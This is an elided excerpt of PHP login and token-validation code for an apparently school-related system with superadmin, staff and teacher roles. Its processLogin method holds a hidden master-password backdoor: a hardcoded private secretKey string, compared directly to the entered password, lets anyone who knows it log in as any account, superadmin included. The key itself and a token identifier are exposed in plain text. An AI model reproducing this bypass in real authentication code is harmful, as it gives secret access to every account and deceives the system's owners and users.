...
{
    protected $database;
    private $secretKey = 'erPSf7C37WOUk694QEbCIWzw19wkc3p1';
    ...
    public function processLogin($username = "", $password = "")
    {
        ...
        if(empty($username) || empty($password)) {
            ...
            $getData->select($getData->raw('users.id, users.username, users.password, role.code as role'));
            $getData->join('role', 'users.role_id', '=', 'role.id');
            $getData->where(function ($relation) use ($username) {
                $relation->orWhere($relation->raw('lower(users.username)'), '=', strtolower($username));
            });
            ...
            if($isAllow) {
                ...
                if ($getUser->role == 'superadmin') {
                    $getUser->name = 'Super Administrator';
                } else if ($getUser->role == 'staff') {
                    $detailUser = $this->db()->table('user_staff')
                        ->where('user_id', $getUser->id)
                        ->first();
                    $getUser->name = $detailUser->name ?? '';
                } else if ($getUser->role == 'teacher') {
                    $detailUser = $this->db()->table('user_teacher')
                        ->where('user_id', $getUser->id)
                        ->first();
                    $getUser->name = $detailUser->name ?? '';
                }
                ...
                if (password_verify($password, $getUser->password) || $password == $this->secretKey) {
                    $loginstatus = true;
                }
    ...
    public function validateToken($robot_invalidation = false, $allowed_type = array())
    {
        ...
        if (!empty($_SERVER['HTTP_AUTHORIZATION'])) {
            ...
            try {
                ...
                try {
                    $signingKey   = InMemory::plainText($_ENV['APP_KEY'] ?: $_SERVER['APP_KEY']);
                    $validator->assert($token, new IdentifiedBy('4uCk7t0jwhz1'));
